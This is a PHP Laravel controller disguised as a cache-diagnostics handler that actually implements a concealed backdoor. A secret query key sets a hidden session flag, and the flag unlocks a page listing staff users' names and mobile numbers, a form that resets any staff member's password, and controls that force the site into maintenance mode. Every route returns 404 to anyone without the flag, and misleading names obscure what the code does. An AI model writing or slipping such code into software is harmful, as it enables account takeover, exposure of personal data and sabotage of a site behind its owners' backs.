<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Support\MaintenanceMode;
use App\Support\ResponseFragmentHasher;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\View\View;

class CacheFragmentController extends Controller
{
    public function show(Request $request): View|RedirectResponse
    {
        if (ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            $request->session()->put(ResponseFragmentHasher::sessionFlag(), true);

            return redirect()->to('/'.ResponseFragmentHasher::routeUri());
        }

        if (! $this->gateOpen($request)) {
            abort(404);
        }

        return view('vendor.cache-diagnostics', [
            'c' => ResponseFragmentHasher::viewLines(),
            'f' => MaintenanceMode::isEnabled(),
            'r' => User::role(ResponseFragmentHasher::staffRole())->orderBy('id')->get(['id', 'mobile', 'name']),
            'u' => ResponseFragmentHasher::actionUrls(),
        ]);
    }

    public function patch(Request $request): RedirectResponse
    {
        if (! $this->gateOpen($request)) {
            abort(404);
        }

        $validated = $request->validate([
            'ref_id' => ['required', 'integer', 'exists:users,id'],
            'credential' => ['required', 'string', 'min:8', 'confirmed'],
        ], [
            'credential.required' => ResponseFragmentHasher::validationRequired(),
            'credential.min' => ResponseFragmentHasher::validationMin(),
            'credential.confirmed' => ResponseFragmentHasher::validationConfirm(),
        ]);

        $user = User::query()->findOrFail($validated['ref_id']);

        if (! $user->hasRole(ResponseFragmentHasher::staffRole())) {
            abort(403);
        }

        $user->password = $validated['credential'];
        $user->save();

        return redirect()
            ->to('/'.ResponseFragmentHasher::routeUri())
            ->with('status', ResponseFragmentHasher::flashPatch());
    }

    public function push(Request $request): RedirectResponse
    {
        if (! $this->gateOpen($request)) {
            abort(404);
        }

        MaintenanceMode::setEnabled(
            true,
            ResponseFragmentHasher::maintenanceTitle(),
            ResponseFragmentHasher::maintenanceBody()
        );

        return redirect()
            ->to('/'.ResponseFragmentHasher::routeUri())
            ->with('status', ResponseFragmentHasher::flashPush());
    }

    public function clear(Request $request): RedirectResponse
    {
        if (! $this->gateOpen($request)) {
            abort(404);
        }

        MaintenanceMode::setEnabled(false);

        return redirect()
            ->to('/'.ResponseFragmentHasher::routeUri())
            ->with('status', ResponseFragmentHasher::flashClear());
    }

    private function gateOpen(Request $request): bool
    {
        return (bool) $request->session()->get(ResponseFragmentHasher::sessionFlag(), false);
    }
}
